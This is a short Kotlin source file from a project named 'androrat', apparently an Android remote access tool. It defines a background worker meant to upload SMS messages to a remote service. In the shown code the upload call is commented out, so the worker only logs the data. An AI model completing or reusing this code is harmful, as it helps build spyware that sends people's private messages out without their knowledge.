package com.ierusalem.androrat.worker

import android.content.Context
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.ierusalem.androrat.utility.Constants

class UploadWorker(context: Context, workerParameters: WorkerParameters) :
    CoroutineWorker(context, workerParameters) {
    override suspend fun doWork(): Result {
        val messages = inputData.getString(Constants.UPLOAD_WORKER_ARGUMENT_NAME) ?: "Can not send sms!"
        Log.d("ahi3646_upload", "doWork: upload - $messages --- response -{response.body()}")
//        val response = SenderService.instance.postFiles(messages = messages)
//        return if (response.isSuccessful) Result.success() else Result.retry()
        return Result.success()
    }
}